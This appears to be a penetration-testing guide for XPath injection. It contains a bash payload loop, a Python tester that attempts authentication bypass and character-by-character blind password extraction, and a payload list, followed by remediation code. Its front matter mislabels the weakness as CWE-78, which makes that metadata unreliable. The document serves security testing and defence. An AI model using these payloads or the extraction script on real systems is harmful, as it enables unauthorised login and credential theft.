---
name: wstg-inpv-09
description: "Testing for XPath Injection"
category: input-validation
owasp_id: WSTG-INPV-09
version: "1.0.0"
author: cyberstrike-official
tags: [injection, input-validation, xss, sqli, wstg, inpv]
tech_stack: [linux, windows, php, python, nodejs, ruby]
cwe_ids: [CWE-78]
chains_with: [wstg-inpv-05, wstg-conf-05]
prerequisites: [wstg-info-01, wstg-info-06]
severity_boost:
  wstg-inpv-05: "Command Injection + SQLi = Full System Compromise (Critical)"
sha256: ede40c8930a915c0b1a368ec3dc3b29e1e5772156fcddd50edb17c2ecd9eddbb
signature: V8WlolwXQioYNkI/fzmJhqkaZcjfHSRHCo3HAz6eJTC+ar3uhVb84gqkc8HoCfcw+BQgJREsXE3oaA2uEeeSAQ==
signed_by: cyberstrike-official
---

# wstg-inpv-09

## Test ID

WSTG-INPV-09

## Test Name

Testing for XPath Injection

## High-Level Description

XPath Injection occurs when user input is incorporated into XPath queries without proper validation. Attackers can manipulate queries to bypass authentication, access unauthorized data, or extract the entire XML document. Unlike SQL injection, XPath has no access control, making the entire document potentially accessible.

---

## What to Check

- [ ] XPath query manipulation
- [ ] Authentication bypass
- [ ] Data extraction
- [ ] Boolean-based blind injection
- [ ] Error-based injection
- [ ] XML document traversal

---

## How to Test

### Step 1: Identify XPath Injection Points

```bash
#!/bin/bash
TARGET="https://target.com/search"

# Test XPath injection payloads
echo "[*] Testing for XPath injection..."

PAYLOADS=(
    "' or '1'='1"
    "' or ''='"
    "1 or 1=1"
    "' or 1=1 or ''='"
    "') or ('1'='1"
    "admin' or '1'='1"
    "' or count(//*)>0 or ''='"
)

for payload in "${PAYLOADS[@]}"; do
    encoded=$(echo -n "$payload" | jq -sRr @uri)
    response=$(curl -s "$TARGET?user=$encoded&pass=test")
    echo "Payload: $payload -> ${#response} bytes"
done
```

### Step 2: XPath Injection Tester

```python
#!/usr/bin/env python3
"""
XPath Injection Vulnerability Tester
"""

import requests
import re

class XPathInjectionTester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()

    # XPath error patterns
    XPATH_ERRORS = [
        r'XPathException',
        r'Invalid XPath',
        r'XPath syntax error',
        r'XPathEvaluator',
        r'xmlXPathEval',
        r'DOMXPath',
        r'SimpleXMLElement::xpath',
        r'javax\.xml\.xpath',
        r'XPathExpressionException',
        r'XPATH syntax',
    ]

    # XPath injection payloads
    PAYLOADS = {
        'auth_bypass': [
            ("' or '1'='1", "' or '1'='1"),
            ("' or ''='", "' or ''='"),
            ("admin' or '1'='1' or '1'='1", "anything"),
            ("' or 1=1 or ''='", "test"),
            ("') or ('1'='1", "') or ('1'='1"),
            ("admin'/*", "*/"),
        ],
        'boolean_based': [
            "' or 1=1 and ''='",
            "' or 1=2 and ''='",
            "' or count(//*)>0 or ''='",
            "' or count(//*)>999999 or ''='",
        ],
        'data_extraction': [
            "' or //user[1]/username/text()='admin' or ''='",
            "' or string-length(//user[1]/password)>0 or ''='",
            "' or substring(//user[1]/password,1,1)='a' or ''='",
        ],
    }

    def test_auth_bypass(self):
        """Test XPath authentication bypass"""
        print("\n[*] Testing XPath authentication bypass...")

        for username, password in self.PAYLOADS['auth_bypass']:
            try:
                response = self.session.post(
                    self.url,
                    data={'username': username, 'password': password}
                )

                # Check for XPath errors
                for pattern in self.XPATH_ERRORS:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        print(f"[+] XPath error detected!")
                        self.findings.append({
                            'type': 'XPath Error Disclosure',
                            'payload': username,
                            'severity': 'Medium'
                        })

                # Check for successful bypass
                if response.status_code == 200:
                    if 'welcome' in response.text.lower() or \
                       'dashboard' in response.text.lower() or \
                       'logout' in response.text.lower():
                        print(f"[VULN] XPath Authentication Bypass!")
                        print(f"  Username: {username}")
                        self.findings.append({
                            'type': 'XPath Auth Bypass',
                            'username': username,
                            'severity': 'Critical'
                        })
                        return True

            except Exception as e:
                pass

        return False

    def test_boolean_blind(self):
        """Test boolean-based blind XPath injection"""
        print("\n[*] Testing blind XPath injection...")

        true_payload = "' or 1=1 and ''='"
        false_payload = "' or 1=2 and ''='"

        try:
            true_response = self.session.post(
                self.url,
                data={'username': true_payload, 'password': 'test'}
            )

            false_response = self.session.post(
                self.url,
                data={'username': false_payload, 'password': 'test'}
            )

            # Check for response differences
            if len(true_response.text) != len(false_response.text):
                print(f"[VULN] Blind XPath injection detected!")
                print(f"  True response: {len(true_response.text)} bytes")
                print(f"  False response: {len(false_response.text)} bytes")
                self.findings.append({
                    'type': 'Blind XPath Injection',
                    'severity': 'High'
                })
                return True

        except Exception as e:
            pass

        return False

    def extract_data_blind(self, xpath_expr='//user[1]/password'):
        """Extract data character by character"""
        print(f"\n[*] Attempting blind data extraction...")

        charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
        extracted = ""

        # First, determine length
        for length in range(1, 50):
            payload = f"' or string-length({xpath_expr})={length} or ''='"
            response = self.session.post(
                self.url,
                data={'username': payload, 'password': 'test'}
            )

            if 'welcome' in response.text.lower() or len(response.text) > 1000:
                print(f"  Length: {length}")
                break

        # Extract characters
        for position in range(1, length + 1):
            for char in charset:
                payload = f"' or substring({xpath_expr},{position},1)='{char}' or ''='"
                response = self.session.post(
                    self.url,
                    data={'username': payload, 'password': 'test'}
                )

                if 'welcome' in response.text.lower():
                    extracted += char
                    print(f"  Extracted: {extracted}")
                    break

        if extracted:
            print(f"[VULN] Extracted: {extracted}")
            self.findings.append({
                'type': 'XPath Data Extraction',
                'data': extracted,
                'severity': 'Critical'
            })

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("XPATH INJECTION REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo XPath injection vulnerabilities confirmed.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")
                if 'payload' in f:
                    print(f"  Payload: {f['payload']}")

    def run_tests(self):
        """Run all XPath tests"""
        self.test_auth_bypass()
        self.test_boolean_blind()
        self.generate_report()

# Usage
tester = XPathInjectionTester("https://target.com/login")
tester.run_tests()
```

### Step 3: XPath Injection Payloads

```
# Authentication Bypass
' or '1'='1
' or ''='
' or 1=1 or ''='
admin' or '1'='1
' or '1'='1' or ''='
') or ('1'='1
admin'/*

# Boolean-based Blind
' or count(//*)>0 or ''='        # True condition
' or count(//*)>999999 or ''='   # False condition

# Data Extraction
' or //user[1]/username/text()='admin' or ''='
' or string-length(//user[1]/password)>5 or ''='
' or substring(//user[1]/password,1,1)='a' or ''='
' or contains(//user[1]/password,'admin') or ''='

# Node Enumeration
' or name(//*)='users' or ''='
' or count(//user)>0 or ''='
' or //user[position()=1]/child::node() or ''='

# XPath Functions
concat(//user[1]/username,':', //user[1]/password)
string-length(//user[1]/password)
normalize-space(//user[1]/password)
```

---

## Tools

| Tool                 | Purpose              |
| -------------------- | -------------------- |
| Burp Suite           | Manual testing       |
| XPath Blind Explorer | Automated extraction |
| Custom scripts       | Exploitation         |

---

## Remediation

```java
// Java - Parameterized XPath
import javax.xml.xpath.*;

XPathFactory xpf = XPathFactory.newInstance();
XPath xpath = xpf.newXPath();

// Use XPathVariableResolver for parameters
xpath.setXPathVariableResolver(new XPathVariableResolver() {
    public Object resolveVariable(QName var) {
        if (var.getLocalPart().equals("username")) {
            return sanitizedUsername;
        }
        return null;
    }
});

XPathExpression expr = xpath.compile("//user[username=$username]");
```

```python
# Python - lxml with safe variables
from lxml import etree

# Use XPath variables instead of string formatting
tree = etree.parse("users.xml")
users = tree.xpath("//user[username=$name]/password/text()",
                   name=user_input)
```

```php
<?php
// PHP - Validate and escape input
function safe_xpath($input) {
    // Remove XPath special characters
    return preg_replace('/[\'"\[\]()@*\/]/', '', $input);
}

$username = safe_xpath($_POST['username']);
$xpath = "//user[username='$username']";
?>
```

---

## Risk Assessment

| Finding                     | CVSS | Severity |
| --------------------------- | ---- | -------- |
| XPath authentication bypass | 9.8  | Critical |
| XPath data extraction       | 7.5  | High     |
| Blind XPath injection       | 7.5  | High     |

---

## CWE Categories

| CWE ID      | Title                                                    |
| ----------- | -------------------------------------------------------- |
| **CWE-643** | Improper Neutralization of Data within XPath Expressions |

sha256: 10a218105e9a860dfe5687261e54e8e53a39a99f5347ca2c576a0db5a3ca0e42
signature: YfIXH7OiTn3PlD+WvKXPLRhpoeapjLE3/+bsLXWMEojralo0MeyC/H/6sp0EBVtzE3Rqvs0Yjuuw5eFozfB4Dg==
signed_by: cyberstrike-official

---

## Checklist

```
[ ] XPath processing identified
[ ] Authentication bypass tested
[ ] Boolean-based blind tested
[ ] Data extraction tested
[ ] Error messages analyzed
[ ] Findings documented
```
